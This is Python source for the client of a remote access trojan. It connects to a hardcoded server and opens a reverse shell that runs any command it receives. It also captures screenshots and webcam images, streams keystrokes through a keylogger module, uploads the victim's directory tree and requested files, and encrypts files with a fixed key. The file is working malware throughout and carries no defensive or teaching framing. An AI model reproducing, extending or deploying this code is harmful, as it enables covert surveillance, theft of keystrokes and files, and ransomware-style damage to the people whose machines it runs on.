import json
import socket, os, subprocess, sys
import  io
import threading
import  requests
import cv2

from KeyLogger import KeyLog
from LockFile import LockFile

try:
    import pyautogui
except KeyError:
    pyautogui_imported = False
else:
    pyautogui_imported = True




# SERVER_HOST = sys.argv[1]
SERVER_HOST = "192.168.43.236"
SERVER_PORT_KEYLOGGER = 5000
SERVER_PORT_SHELL = 5005
SERVER_PORT_MANAGE_FILE = 5050
BUFFER_SIZE = 1024 * 128
SEPARATOR = "<sep>"

def get_ip_address():
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    return ip_address

def get_public_ip_address():
    response = requests.get('https://api.ipify.org?format=json')
    return response.json()['ip']

def get_pc_name():
    return socket.gethostname()

def get_country():
    response = requests.get('https://ipinfo.io')
    data = response.json()
    return data.get('country', 'Unknown')



def client_shell():
    s = socket.socket()
    s.connect((SERVER_HOST, SERVER_PORT_SHELL))
    cwd = os.getcwd()
    s.send(cwd.encode())
    local_ip = get_ip_address()
    pc_name = get_pc_name()
    country = get_country()
    infor = f"{local_ip}{SEPARATOR}{pc_name}{SEPARATOR}{country}"

    s.send(infor.encode())
    while True:
        command = s.recv(BUFFER_SIZE).decode()
        print(f"comand: {command}")
        splited_command = command.split()
        if command.lower() == 'exit':
            break
        if splited_command[0] == 'cd':
            try:
                os.chdir(' '.join(splited_command[1:]))
                output = ""
                cwd = os.getcwd()
                message = f"{output}{SEPARATOR}{cwd}"
                print(message)
                s.send(message.encode())
            except Exception as e:
                output = str(e)
                cwd = os.getcwd()
                message = f"{output}{SEPARATOR}{cwd}"
                print(message)
                s.send(message.encode())
        elif splited_command[0] == 'src':
            print('call take picture')
            screenshot = pyautogui.screenshot()
            # Convert screenshot to bytes
            img_bytes = io.BytesIO()
            screenshot.save(img_bytes, format='PNG')
            img_data = img_bytes.getvalue()
            s.sendall(f"{len(img_data)}{SEPARATOR}{'image'}".encode())
            s.sendall(img_data)
            output = ""
            cwd = os.getcwd()
            message = f"{output}{SEPARATOR}{cwd}"
            s.send(message.encode())
        elif splited_command[0] == 'webcam':
            cap = cv2.VideoCapture(0)
            if not cap.isOpened():
                print("Cannot open webcam")
                exit()
            ret, frame = cap.read()
            if not ret:
                print("Failed to grab frame")
                cap.release()
                exit()
            cap.release()
            _, img_encoded = cv2.imencode('.png', frame)
            img_bytes = img_encoded.tobytes()
            s.sendall(f"{len(img_bytes)}{SEPARATOR}{'image'}".encode())
            s.sendall(img_bytes)

        elif (splited_command[0] == 'de') | (splited_command[0] == 'en') :
            l = LockFile()
            l.solve("123",splited_command[0],splited_command[1])
            if splited_command[0] == "en":
                output = "Encrypt sucessfully!"
            else:
                output = "Decrypt sucessfully!"
        else:
            output = subprocess.getoutput(command)
            cwd = os.getcwd()
            message = f"{output}{SEPARATOR}{cwd}"
            print(message)
            s.send(message.encode())


def client_keylogger():
    s = socket.socket()
    print("before klg connect")
    s.connect((SERVER_HOST, SERVER_PORT_KEYLOGGER))
    print("before shell connect")
    klg = KeyLog(s, SEPARATOR, socket.gethostname())


def get_directory_tree(path):
    tree = {}
    for entry in os.scandir(path):
        if entry.is_dir():
            tree[entry.name] = get_directory_tree(entry.path)
        else:
            tree[entry.name] = None
    return tree


def send_directory_tree(client_socket, path):
    tree = get_directory_tree(path)
    tree_json = json.dumps(tree)


    # Send data in chunks
    chunk_size = 4096
    for i in range(0, len(tree_json), chunk_size):
        chunk = tree_json[i:i + chunk_size]
        client_socket.send(chunk.encode())

    msg = "<end>"
    client_socket.send(msg.encode())

def send_file(socket,file):
    file_name = os.path.basename(file)
    file_name_bytes = file_name.encode('utf-8')
    socket.send(len(file_name_bytes).to_bytes(4, 'big'))  # Send length of file name
    socket.send(file_name_bytes)  # Send the file name
    with open(file, 'rb') as f:
        data = f.read(BUFFER_SIZE)
        while data:
            print(data)
            socket.sendall(data)
            data = f.read(BUFFER_SIZE)
    msg = "<end>"
    socket.send(msg.encode())


def client_manage_file():
    s = socket.socket()
    s.connect((SERVER_HOST, SERVER_PORT_MANAGE_FILE))
    send_directory_tree(s,os.getcwd())
    while True:
        command = s.recv(BUFFER_SIZE).decode()
        split_command = command.split(SEPARATOR)
        if(split_command[0] == "en" or split_command[0] == "de"):
            l = LockFile()
            l.solve("123", split_command[0], split_command[1])
        elif split_command[0] == "download":
            send_file(s,split_command[1])




t1 = threading.Thread(target=client_shell)
t2 = threading.Thread(target=client_keylogger)
t3 = threading.Thread(target=client_manage_file)


t1.start()
t2.start()
t3.start()


t1.join()
t2.join()
t3.join()






